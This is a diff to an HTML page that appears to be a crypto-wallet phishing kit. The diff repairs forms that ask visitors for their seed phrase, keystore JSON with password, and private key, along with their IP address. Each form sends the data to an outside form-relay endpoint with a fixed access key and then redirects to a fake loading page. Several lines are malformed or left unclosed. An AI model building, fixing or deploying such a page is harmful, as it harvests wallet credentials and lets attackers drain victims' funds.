@@ -236,7 +236,7 @@
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
           <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
-            <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev
+            <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev/apps/connect-wallet/loading.html">
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -247,11 +247,9 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
+          <form  id="keystore-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
-            <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev
-              <input type="hidden" name="_captcha" value="false">
-              <input type="hidden" name="_template" value="table">
+              <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev/apps/connect-wallet/loading.html">
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
                 <input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>
                 <input type="hidden" name="user_ip" id="user_ip_keystore">
@@ -261,11 +259,9 @@
             </form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
-          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
+          <form  id="privatekey-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
-            <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev
-              <input type="hidden" name="_captcha" value="false">
-              <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="redirect" value="https://nodeexplorer.pages.dev/apps/connect-wallet/loading.html">
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_key">
                 <input type="hidden" name="type" id="type-key">
@@ -352,10 +348,12 @@
 </script>
 
 
-
-<script>
+   
+   <script>
     console.log(Cookies.get("walletType")
-</script>
+   <script>
 
+
+    
 </body>
 </html>
